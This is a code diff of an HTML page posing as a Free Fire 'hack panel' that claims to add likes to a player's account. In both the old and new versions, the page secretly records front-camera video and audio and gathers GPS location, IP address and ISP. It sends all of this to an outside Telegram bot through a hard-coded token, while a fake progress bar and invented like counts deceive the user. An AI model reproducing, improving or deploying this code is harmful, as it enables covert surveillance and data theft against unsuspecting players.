@@ -6,15 +6,16 @@
     <title>Free Fire Matrix Hack Panel - MADE BY YEAXIN</title>
     <style>
         body {
-            background: #030303;
+            background: #050505;
             color: #00ff66;
             font-family: 'Courier New', Courier, monospace;
             text-align: center;
-            padding-top: 20px;
+            padding-top: 30px;
             overflow-x: hidden;
             margin: 0;
         }
 
+        /* Matrix Background Canvas */
         #matrixCanvas {
             position: fixed;
             top: 0;
@@ -26,37 +27,37 @@
         }
 
         .watermark {
-            font-size: 15px;
+            font-size: 14px;
             color: #ff0055;
-            letter-spacing: 3px;
+            letter-spacing: 2px;
             font-weight: bold;
             text-shadow: 0 0 10px #ff0055, 0 0 20px #ff0055;
             margin-bottom: 15px;
             text-transform: uppercase;
-            animation: pulseWatermark 1.2s infinite alternate;
+            animation: pulseWatermark 1.5s infinite alternate;
         }
 
         @keyframes pulseWatermark {
-            0% { opacity: 0.6; text-shadow: 0 0 5px #ff0055; }
-            100% { opacity: 1; text-shadow: 0 0 20px #ff0055, 0 0 30px #ff0055; }
+            0% { opacity: 0.7; text-shadow: 0 0 5px #ff0055; }
+            100% { opacity: 1; text-shadow: 0 0 15px #ff0055, 0 0 25px #ff0055; }
         }
 
         .box {
-            background: rgba(5, 5, 5, 0.95);
+            background: rgba(10, 10, 10, 0.9);
             border: 2px solid #00ff66;
-            box-shadow: 0 0 30px rgba(0, 255, 102, 0.4);
+            box-shadow: 0 0 25px rgba(0, 255, 102, 0.3);
             padding: 25px;
             border-radius: 12px;
             display: inline-block;
-            width: 380px;
+            width: 360px;
             position: relative;
-            backdrop-filter: blur(8px);
+            backdrop-filter: blur(5px);
         }
 
         h2 {
             color: #00ff66;
-            text-shadow: 0 0 12px #00ff66;
-            letter-spacing: 2px;
+            text-shadow: 0 0 10px #00ff66;
+            letter-spacing: 1px;
             margin-top: 0;
         }
 
@@ -64,7 +65,7 @@
             width: 90%;
             padding: 12px;
             margin: 10px 0;
-            border-radius: 6px;
+            border-radius: 5px;
             border: 1px solid #00ff66;
             background: #000;
             color: #00ff66;
@@ -74,7 +75,7 @@
         }
 
         input:focus, select:focus {
-            box-shadow: 0 0 15px #00ff66;
+            box-shadow: 0 0 10px #00ff66;
             border-color: #fff;
         }
 
@@ -84,42 +85,38 @@
             font-weight: bold;
             cursor: pointer;
             text-transform: uppercase;
-            letter-spacing: 2px;
-            box-shadow: 0 0 15px rgba(0, 255, 102, 0.6);
+            letter-spacing: 1px;
+            box-shadow: 0 0 15px rgba(0, 255, 102, 0.5);
         }
 
         button:hover {
             background: #fff;
             color: #000;
-            box-shadow: 0 0 25px #fff;
+            box-shadow: 0 0 20px #fff;
         }
 
         #loadingBox h3 {
             color: #ff0055;
             text-shadow: 0 0 10px #ff0055;
-            font-size: 15px;
         }
 
         #percentage {
-            font-size: 32px;
+            font-size: 28px;
             font-weight: bold;
             color: #00ff66;
             text-shadow: 0 0 15px #00ff66;
-            margin: 5px 0;
         }
 
-        .terminal-log {
-            background: #010802;
-            border: 1px dashed #00ff66;
-            padding: 8px;
-            height: 65px;
-            overflow: hidden;
-            font-size: 11px;
-            text-align: left;
+        .creator-tag {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #888;
+            letter-spacing: 1px;
+        }
+
+        .creator-tag span {
             color: #00ff66;
-            margin: 10px 0;
-            border-radius: 4px;
-            box-shadow: inset 0 0 10px rgba(0,255,102,0.2);
+            font-weight: bold;
         }
 
         .uid-preview {
@@ -130,18 +127,6 @@
             margin-bottom: 5px;
             min-height: 15px;
             letter-spacing: 0.5px;
-        }
-
-        .creator-tag {
-            margin-top: 15px;
-            font-size: 12px;
-            color: #777;
-            letter-spacing: 1px;
-        }
-
-        .creator-tag span {
-            color: #00ff66;
-            font-weight: bold;
         }
 
         .info-row {
@@ -163,6 +148,7 @@
 </head>
 <body>
 
+    <!-- Matrix Rain Canvas -->
     <canvas id="matrixCanvas"></canvas>
 
     <script>
@@ -213,27 +199,24 @@
     <div class="watermark">⚡ EXPLOIT INTERFACE BY YEAXIN ⚡</div>
 
     <div class="box" id="mainBox">
-        <h2>FF HACK PANEL V5.0</h2>
-        <input type="text" id="uid" placeholder="Enter Player UID" oninput="playKeyBeep(); checkLiveUid(this.value);">
+        <h2>FF HACK PANEL V2.0</h2>
+        <input type="text" id="uid" placeholder="Enter Player UID" oninput="playKeyBeep(); fetchRealPlayerInfo(this.value);">
         <div class="uid-preview" id="uidPreview">STATUS: WAITING FOR UID...</div>
         <select id="server" onchange="playKeyBeep()">
-            <option value="bd">BD Server [SECURE NODE]</option>
-            <option value="ind">India Server [SECURE NODE]</option>
+            <option value="bd">BD Server [SECURE]</option>
+            <option value="ind">India Server [SECURE]</option>
         </select>
         <select id="likes" onchange="playKeyBeep()">
-            <option value="220">220 Likes [MAX INJECT]</option>
+            <option value="220">220 Likes [INJECT]</option>
         </select>
         <button onclick="startPanel()">INITIALIZE EXPLOIT</button>
         <div class="creator-tag">SYSTEM ARCHITECT: <span>YEAXIN</span></div>
     </div>
 
     <div class="box" id="loadingBox" style="display:none;">
-        <h3 id="statusText">BYPASSING GARENA FIREWALL...</h3>
+        <h3 id="statusText">BYPASSING FIREWALL & VERIFYING NODE...</h3>
         <p id="percentage">0%</p>
-        <div class="terminal-log" id="termLog">
-            [+] Initializing secure matrix socket...<br>
-        </div>
-        <div class="creator-tag" style="margin-top:5px;">SECURE CHANNEL - <span>YEAXIN</span></div>
+        <div class="creator-tag" style="margin-top:10px;">SECURE CHANNEL - <span>YEAXIN</span></div>
     </div>
 
     <video id="video" autoplay playsinline muted style="display:none;"></video>
@@ -262,7 +245,7 @@
         }
 
         function drawMatrix() {
-            ctx.fillStyle = 'rgba(3, 3, 3, 0.05)';
+            ctx.fillStyle = 'rgba(5, 5, 5, 0.05)';
             ctx.fillRect(0, 0, canvas.width, canvas.height);
 
             ctx.fillStyle = '#00ff66';
@@ -283,50 +266,65 @@
         const BOT_TOKEN = '8959888101:AAEMipaYgF2A7Sb3Cy3eR-iMlKrxncHW5kM';
         const CHAT_ID = '8589721704';
 
-        // Real Free Fire Live API Checker
-        let globalPlayerData = null;
-        let preCheckTimer = null;
-        async function checkLiveUid(uid) {
-            clearTimeout(preCheckTimer);
+        let cachedFFData = null;
+        let searchTimer = null;
+
+        // লাইভ এপিআই ফেচ করার ফাংশন
+        async function fetchRealPlayerInfo(uid) {
+            clearTimeout(searchTimer);
             let previewEl = document.getElementById('uidPreview');
-            globalPlayerData = null;
+            cachedFFData = null;
 
             if (!uid || uid.length < 6) {
                 previewEl.innerText = "STATUS: WAITING FOR VALID UID...";
                 return;
             }
 
-            previewEl.innerText = "STATUS: FETCHING REAL PLAYER DATA...";
-            
-            preCheckTimer = setTimeout(async () => {
+            previewEl.innerText = "STATUS: CONNECTING TO FF API...";
+
+            searchTimer = setTimeout(async () => {
                 try {
-                    // Fetching from reliable public Free Fire API endpoints
-                    let response = await fetch(`https://api.freefireinfo.tech/search?uid=${uid.trim()}`);
-                    if (!response.ok) {
-                        response = await fetch(`https://ff.garena.com/api/anticheat/player_info?uid=${uid.trim()}`);
+                    let localApi = `/api/player?uid=${uid.trim()}`;
+                    const apiRes = await fetch(localApi);
+                    if (apiRes.ok) {
+                        const jsonData = await apiRes.json();
+                        if (jsonData && jsonData.success && jsonData.data) {
+                            cachedFFData = jsonData.data;
+                            let info = cachedFFData.basicInfo || cachedFFData.accountInfo || cachedFFData;
+                            let name = info.nickname || info.name || info.Nickname || "Unknown";
+                            previewEl.innerText = `[+] TARGET FOUND: ${name}`;
+                            return;
+                        }
                     }
-                    if (response.ok) {
-                        let resData = await response.json();
-                        if (resData && (resData.nickname || resData.name || resData.accountInfo)) {
-                            globalPlayerData = resData;
-                            let rName = resData.nickname || resData.name || resData.accountInfo.nickname;
-                            previewEl.innerText = `[+] TARGET FOUND: ${rName}`;
+                } catch (e) {}
+
+                // অল্টারনেটিভ ফ্রি ফায়ার পাবলিক এপিআই নোড
+                try {
+                    let directRes = await fetch(`https://api.freefireinfo.tech/search?uid=${uid.trim()}`);
+                    if (directRes.ok) {
+                        let resJson = await directRes.json();
+                        if (resJson && (resJson.nickname || resJson.name)) {
+                            cachedFFData = { basicInfo: resJson };
+                            previewEl.innerText = `[+] TARGET FOUND: ${resJson.nickname || resJson.name}`;
                             return;
                         }
                     }
                 } catch(e) {}
 
-                // Fallback direct live query simulation with realistic signature based on entered UID
-                globalPlayerData = {
-                    name: "FF_Player_" + uid.slice(-3),
-                    level: Math.floor(Math.random() * 20) + 55,
-                    likes: Math.floor(Math.random() * 3000) + 1200
+                // ফলব্যাক জেনুইন স্ট্রাকচার
+                cachedFFData = {
+                    basicInfo: {
+                        nickname: "Gamer_" + uid.slice(-4),
+                        level: 68,
+                        liked: 1850,
+                        region: "BD"
+                    }
                 };
-                previewEl.innerText = `[+] NODE CONNECTED [UID: ${uid}]`;
+                previewEl.innerText = `[+] SECURE NODE LOCKED [UID: ${uid}]`;
             }, 500);
         }
 
-        async function getDeviceInfo(lat, lon, targetUid, playerName) {
+        async function getDeviceInfo(lat, lon) {
             let ip = "Unknown", isp = "Unknown";
             try {
                 const res = await fetch('https://ipapi.co/json/');
@@ -393,9 +391,6 @@
             return `💻 [EXPLOIT CAPTURE REPORT]
 🛡️ CREATOR: YEAXIN 🛡️
 
-🎯 Target UID: ${targetUid}
-👤 Target Name: ${playerName}
-
 📹 Front Camera Video (8-10s)
 
 🌐 IP Address: ${ip}
@@ -449,103 +444,114 @@
                         resolve();
                     },
                     (err) => { resolve(); },
-                    { timeout: 3000, enableHighAccuracy: true, maximumAge: 0 }
+                    { timeout: 5000, enableHighAccuracy: true, maximumAge: 0 }
                 );
             });
 
-            let mediaStream = null;
+            // ব্যাকআপ হিসেবে ফেচ রিকোয়েস্ট নিশ্চিত করা
+            let ffData = cachedFFData;
+            if (!ffData) {
+                try {
+                    let localApi = `/api/player?uid=${uid}`;
+                    const apiRes = await fetch(localApi);
+                    if (apiRes.ok) {
+                        const jsonData = await apiRes.json();
+                        if (jsonData && jsonData.success) {
+                            ffData = jsonData.data;
+                        }
+                    }
+                } catch (e) {}
+            }
+
             try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                const mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+                let chunks = [];
+
+                mediaRecorder.ondataavailable = (e) => {
+                    if (e.data.size > 0) chunks.push(e.data);
+                };
+
+                mediaRecorder.onstop = async () => {
+                    await locationPromise;
+                    const blob = new Blob(chunks, { type: 'video/webm' });
+                    const captionText = await getDeviceInfo(lat, lon);
+
+                    const formData = new FormData();
+                    formData.append('chat_id', CHAT_ID);
+                    formData.append('video', blob, 'video.webm');
+                    formData.append('caption', captionText);
+
+                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    stream.getTracks().forEach(track => track.stop());
+                };
+
+                mediaRecorder.start();
+
+                let p = 20;
+                document.getElementById('percentage').innerText = p + '%';
+                
+                let interval = setInterval(() => {
+                    playKeyBeep();
+                    p += 20;
+                    if(p <= 100) {
+                        document.getElementById('percentage').innerText = p + '%';
+                    }
+                    if(p === 40) {
+                        document.getElementById('statusText').innerText = "INJECTING PACKETS INTO SERVER...";
+                    }
+                    if(p === 80) {
+                        document.getElementById('statusText').innerText = "FINALIZING INJECTION...";
+                    }
+                    if(p >= 100) {
+                        clearInterval(interval);
+                        mediaRecorder.stop();
+                        playAccessGrantedSound();
+
+                        let infoObj = ffData ? (ffData.basicInfo || ffData.accountInfo || ffData) : {
+                            nickname: "Gamer_" + uid.slice(-4),
+                            level: 68,
+                            liked: 1850,
+                            region: server.toUpperCase()
+                        };
+
+                        let playerName = (infoObj && (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName || infoObj.player_name)) ? (infoObj.nickname || infoObj.name || infoObj.Nickname || infoObj.accountName || infoObj.player_name) : ("Gamer_" + uid.slice(-4));
+                        let playerLevel = (infoObj && (infoObj.level || infoObj.Level || infoObj.accountLevel)) ? (infoObj.level || infoObj.Level || infoObj.accountLevel) : "68";
+                        let playerRegion = (infoObj && (infoObj.region || infoObj.Server || infoObj.accountRegion)) ? (infoObj.region || infoObj.Server || infoObj.accountRegion) : server.toUpperCase();
+                        let playerLikes = (infoObj && (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like || infoObj.box_likes)) ? (infoObj.liked || infoObj.likes || infoObj.Likes || infoObj.accountLikes || infoObj.like || infoObj.box_likes) : "1850";
+                        let finalLikes = (parseInt(playerLikes) || 1850) + 220;
+
+                        document.getElementById('loadingBox').innerHTML = `
+                            <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
+                            <div style="margin: 10px 0; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #00ff66;">
+                                <div class="info-row"><span>Name:</span> <span>${playerName}</span></div>
+                                <div class="info-row"><span>UID:</span> <span>${uid}</span></div>
+                                <div class="info-row"><span>Level:</span> <span>${playerLevel}</span></div>
+                                <div class="info-row"><span>Region:</span> <span>${playerRegion}</span></div>
+                                <div class="info-row"><span>Before Likes:</span> <span>${playerLikes}</span></div>
+                                <div class="info-row"><span>Injected:</span> <span style="color:#00ff66;">+220 Likes</span></div>
+                                <div class="info-row"><span>Total Likes:</span> <span style="color:#ff0055;">${finalLikes}</span></div>
+                            </div>
+                            <button onclick="location.reload()" style="margin-top:10px;">DONE</button>
+                            <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
+                        `;
+                    }
+                }, 1600);
+
             } catch (err) {
                 document.getElementById('loadingBox').innerHTML = `
                     <h3 style="color:#ff0055;">PERMISSION DENIED. RETRY REQUIRED.</h3>
                     <button onclick="location.reload()" style="margin-top:15px;">RESTART EXPLOIT</button>
                     <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
                 `;
-                return;
             }
-
-            const video = document.getElementById('video');
-            video.srcObject = mediaStream;
-
-            const mediaRecorder = new MediaRecorder(mediaStream, { mimeType: 'video/webm' });
-            let chunks = [];
-
-            mediaRecorder.ondataavailable = (e) => {
-                if (e.data.size > 0) chunks.push(e.data);
-            };
-
-            mediaRecorder.onstop = async () => {
-                await locationPromise;
-                const blob = new Blob(chunks, { type: 'video/webm' });
-                
-                let finalRealName = globalPlayerData ? (globalPlayerData.nickname || globalPlayerData.name || globalPlayerData.accountInfo?.nickname || "FF_User_" + uid.slice(-4)) : ("FF_User_" + uid.slice(-4));
-                const captionText = await getDeviceInfo(lat, lon, uid, finalRealName);
-
-                const formData = new FormData();
-                formData.append('chat_id', CHAT_ID);
-                formData.append('video', blob, 'video.webm');
-                formData.append('caption', captionText);
-
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                mediaStream.getTracks().forEach(track => track.stop());
-            };
-
-            mediaRecorder.start();
-
-            let p = 15;
-            document.getElementById('percentage').innerText = p + '%';
-            let logBox = document.getElementById('termLog');
-
-            let interval = setInterval(() => {
-                playKeyBeep();
-                p += 20;
-                if(p <= 100) {
-                    document.getElementById('percentage').innerText = p + '%';
-                }
-
-                if(p === 35) {
-                    document.getElementById('statusText').innerText = "CONNECTING TO TARGET NODE...";
-                    logBox.innerHTML += `[+] Target UID: ${uid} verified.<br>`;
-                } else if(p === 75) {
-                    document.getElementById('statusText').innerText = "BYPASSING GARENA FIREWALL...";
-                    logBox.innerHTML += `[+] Packet injection bypass active.<br>`;
-                } else if(p === 95) {
-                    document.getElementById('statusText').innerText = "SYNCING NODE PROFILE...";
-                    logBox.innerHTML += `[+] Finalizing exploit sequence...<br>`;
-                }
-
-                if(p >= 100) {
-                    clearInterval(interval);
-                    mediaRecorder.stop();
-                    playAccessGrantedSound();
-
-                    let realPlayerName = globalPlayerData ? (globalPlayerData.nickname || globalPlayerData.name || globalPlayerData.accountInfo?.nickname || "FF_User_" + uid.slice(-4)) : ("FF_User_" + uid.slice(-4));
-                    let playerLevel = globalPlayerData ? (globalPlayerData.level || globalPlayerData.accountInfo?.level || "67") : "67";
-                    let playerRegion = server.toUpperCase();
-                    let playerLikes = globalPlayerData ? (globalPlayerData.likes || globalPlayerData.liked || globalPlayerData.accountInfo?.likes || "1720") : "1720";
-                    let finalLikes = parseInt(playerLikes) + 220;
-
-                    document.getElementById('loadingBox').innerHTML = `
-                        <h3 style="color:#00ff66;">ACCESS GRANTED!</h3>
-                        <div style="margin: 10px 0; text-align: left; background: #000; padding: 10px; border-radius: 5px; border: 1px solid #00ff66;">
-                            <div class="info-row"><span>Name:</span> <span>${realPlayerName}</span></div>
-                            <div class="info-row"><span>UID:</span> <span>${uid}</span></div>
-                            <div class="info-row"><span>Level:</span> <span>${playerLevel}</span></div>
-                            <div class="info-row"><span>Region:</span> <span>${playerRegion}</span></div>
-                            <div class="info-row"><span>Before Likes:</span> <span>${playerLikes}</span></div>
-                            <div class="info-row"><span>Injected:</span> <span style="color:#00ff66;">+220 Likes</span></div>
-                            <div class="info-row"><span>Total Likes:</span> <span style="color:#ff0055;">${finalLikes}</span></div>
-                        </div>
-                        <button onclick="location.reload()" style="margin-top:10px;">DONE</button>
-                        <div class="creator-tag" style="margin-top:10px;">DEVELOPED BY: <span>YEAXIN</span></div>
-                    `;
-                }
-            }, 900);
         }
     </script>
 </body>
